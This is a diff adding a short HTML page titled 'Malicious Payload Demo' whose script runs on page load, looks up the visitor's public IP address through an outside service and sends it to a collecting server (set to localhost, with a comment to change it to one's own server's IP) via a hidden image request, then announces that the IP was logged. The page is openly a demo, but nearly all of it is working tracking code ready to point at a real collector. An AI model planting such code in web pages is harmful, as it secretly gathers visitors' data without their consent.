@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malicious Payload</title>
+</head>
+<body>
+    <h1>Welcome to the Malicious Payload Demo</h1>
+    <script>
+        // This script will execute when the page loads
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'https://api.ipify.org?format=json', true);
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                var ip = JSON.parse(xhr.responseText).ip;
+                var img = new Image();
+                img.src = 'http://localhost:8001/?ip=' + ip;  // Change to your server's IP if needed
+                alert("Your IP has been logged!");
+            }
+        };
+        xhr.send();
+    </script>
+</body>
+</html>
